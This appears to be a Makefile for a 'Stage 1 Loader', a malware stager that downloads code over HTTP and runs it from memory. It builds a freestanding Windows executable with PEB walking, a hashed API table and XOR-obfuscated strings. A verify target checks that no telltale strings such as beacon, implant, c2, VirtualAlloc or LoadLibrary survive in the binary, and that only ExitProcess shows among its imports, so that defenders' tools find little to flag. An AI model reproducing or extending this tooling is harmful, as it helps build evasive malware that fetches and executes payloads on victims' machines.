# Stage 1 Loader Makefile.
#
# Targets:
#   make linux    - Linux ELF (development iteration only)
#   make windows  - Windows PE via mingw-w64 (the real deliverable)
#   make all      - both
#   make verify   - run strings/IAT/size checks on build/stage1.exe
#   make check    - verify binary size constraint
#   make clean    - remove build/
#
# Windows target: freestanding build. No CRT. No default libraries.
# Entry point = stage1_entry in src/main.c. IAT goal = {kernel32.dll!ExitProcess}.

BUILD_DIR := build

# Shared across platforms
SHARED_SRCS := src/main.c src/xor.c

# Linux-specific
LINUX_SRCS := $(SHARED_SRCS) src/http_linux.c src/mem_exec_linux.c

# Windows-specific (PEB walker, api table, xs decoder all pulled in)
WIN_SRCS := $(SHARED_SRCS) \
            src/http_win.c src/mem_exec_win.c \
            src/peb_walk.c src/api_table.c src/xor_string.c

COMMON_CFLAGS := -Os -fno-stack-protector -fno-asynchronous-unwind-tables \
                 -fno-ident -fno-exceptions -fdata-sections -ffunction-sections \
                 -Wall -Wextra -Werror -Isrc

# Linux
CC := gcc
LINUX_CFLAGS := $(COMMON_CFLAGS)
LINUX_LDFLAGS := -Wl,--gc-sections -Wl,--strip-all -s

# Windows: freestanding — no CRT, no default libs, custom entry, frame-size
# control. -fno-builtin-mem{cpy,set} blocks the compiler from emitting calls
# to memcpy/memset on aggregate copies (we have no libc to satisfy them).
MINGW := x86_64-w64-mingw32-gcc
WIN_CFLAGS := $(COMMON_CFLAGS) -ffreestanding \
              -fno-builtin-memcpy -fno-builtin-memset \
              -mno-stack-arg-probe
WIN_LDFLAGS := -nostdlib -nodefaultlibs -nostartfiles \
               -Wl,--entry=stage1_entry \
               -Wl,--gc-sections -Wl,--strip-all -s -lkernel32

# Size target (20 KB per S33 plan)
MAX_SIZE := 20480

LINUX_OUT := $(BUILD_DIR)/stage1
WIN_OUT := $(BUILD_DIR)/stage1.exe

# Forbidden-token regex for `make verify`. Keep in sync with plan / README.
FORBIDDEN := '(oxide|beacon|stage|implant|c2|http://|https://|User-Agent|Mozilla|VirtualAlloc|LoadLibrary|GetProcAddress|wininet|InternetOpen|kernel32|ntdll|OXID|/api/)'

.PHONY: all linux windows clean check verify

all: linux windows

linux: $(BUILD_DIR)
	$(CC) $(LINUX_CFLAGS) $(LINUX_SRCS) -o $(LINUX_OUT) $(LINUX_LDFLAGS)
	@echo "Built: $(LINUX_OUT)"
	@stat -c "Size: %s bytes" $(LINUX_OUT)

windows: $(BUILD_DIR)
	@if command -v $(MINGW) >/dev/null 2>&1; then \
		$(MINGW) $(WIN_CFLAGS) $(WIN_SRCS) -o $(WIN_OUT) $(WIN_LDFLAGS); \
		echo "Built: $(WIN_OUT)"; \
		stat -c "Size: %s bytes" $(WIN_OUT); \
	else \
		echo "SKIP: mingw-w64 not installed (pacman -S mingw-w64-gcc)"; \
		exit 1; \
	fi

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

clean:
	rm -rf $(BUILD_DIR)

# Size gate
check: all
	@echo "Checking size constraints..."
	@WIN_SIZE=$$(stat -c %s $(WIN_OUT) 2>/dev/null || echo 0); \
	if [ "$$WIN_SIZE" -gt $(MAX_SIZE) ]; then \
		echo "FAIL: Windows binary ($$WIN_SIZE) exceeds $(MAX_SIZE) bytes"; \
		exit 1; \
	else \
		echo "PASS: Windows binary ($$WIN_SIZE) <= $(MAX_SIZE) bytes"; \
	fi

# Static-cleanliness gate — run after `make windows`.
verify: $(WIN_OUT)
	@echo "=== strings leak scan ==="
	@LEAKS=$$(strings -n 5 $(WIN_OUT) | grep -iE $(FORBIDDEN) || true); \
	if [ -n "$$LEAKS" ]; then \
		echo "FAIL: forbidden tokens in $(WIN_OUT):"; \
		echo "$$LEAKS"; \
		exit 1; \
	else \
		echo "PASS: no forbidden tokens"; \
	fi
	@echo
	@echo "=== IAT inspection ==="
	@x86_64-w64-mingw32-objdump -p $(WIN_OUT) | awk '/DLL Name:/ {print} /\sExitProcess|\sLoadLibrary|\sVirtual|\sInternet/ {print}'
	@echo
	@echo "=== size ==="
	@stat -c "%s bytes" $(WIN_OUT)
